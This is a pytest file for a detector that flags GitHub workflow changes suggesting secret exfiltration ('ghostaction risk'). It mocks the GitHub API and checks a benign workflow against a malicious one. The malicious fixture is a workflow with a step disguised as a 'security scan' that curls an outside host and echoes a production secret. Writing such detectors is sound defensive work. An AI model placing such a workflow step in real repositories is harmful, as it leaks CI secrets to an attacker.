import base64

import pytest

from app.signals.workflow_exfiltration import FetchBudget, detect_ghostaction_risk

class DummyGitHub:
    def __init__(self, commit_files, contents_map, user=None, permission=None):
        self._commit_files = commit_files
        self._contents_map = contents_map
        self._user = user or {
            "type": "User",
            "created_at": "2020-01-01T00:00:00Z",
            "followers": 1,
            "public_repos": 3,
            "site_admin": False,
        }
        self._permission = permission

    async def get_commit(self, owner, repo, sha):
        return {"files": self._commit_files}

    async def get_contents(self, owner, repo, path, ref=None):
        return self._contents_map[(path, ref)]

    async def get_user(self, login):
        return self._user

    async def get_collaborator_permission(self, owner, repo, login):
        return self._permission

def _event():
    return {
        "type": "PushEvent",
        "repo": {"name": "org/repo"},
        "actor": {"login": "alice"},
        "created_at": "2024-01-01T00:00:00Z",
        "payload": {"head": "abc123", "commits": []},
    }

@pytest.mark.asyncio
async def test_ghostaction_risk_emits_incident():
    text = """
    on: pull_request_target
    permissions:
      contents: write
    jobs:
      build:
        runs-on: self-hosted
        steps:
          - name: security scan
            run: curl -X POST https://bold-dhawan.45-139-104-115.plesk.page/collect
          - run: echo ${{ secrets.PROD_KEY }}
    """
    encoded = base64.b64encode(text.encode("utf-8")).decode("utf-8")
    contents = {
        (".github/workflows/ci.yml", "abc123"): {
            "encoding": "base64",
            "content": encoded,
        }
    }
    gh = DummyGitHub([{"filename": ".github/workflows/ci.yml"}], contents, permission="write")
    budget = FetchBudget(5)

    incidents = await detect_ghostaction_risk(_event(), gh, budget)
    assert len(incidents) == 1
    inc = incidents[0]
    assert inc["kind"] == "ghostaction_risk"
    assert "risk:critical" in inc["tags_json"]

@pytest.mark.asyncio
async def test_ghostaction_risk_benign_returns_none():
    text = """
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: echo "hello"
    """
    encoded = base64.b64encode(text.encode("utf-8")).decode("utf-8")
    contents = {
        (".github/workflows/ci.yml", "abc123"): {
            "encoding": "base64",
            "content": encoded,
        }
    }
    gh = DummyGitHub([{"filename": ".github/workflows/ci.yml"}], contents)
    budget = FetchBudget(5)

    incidents = await detect_ghostaction_risk(_event(), gh, budget)
    assert incidents == []
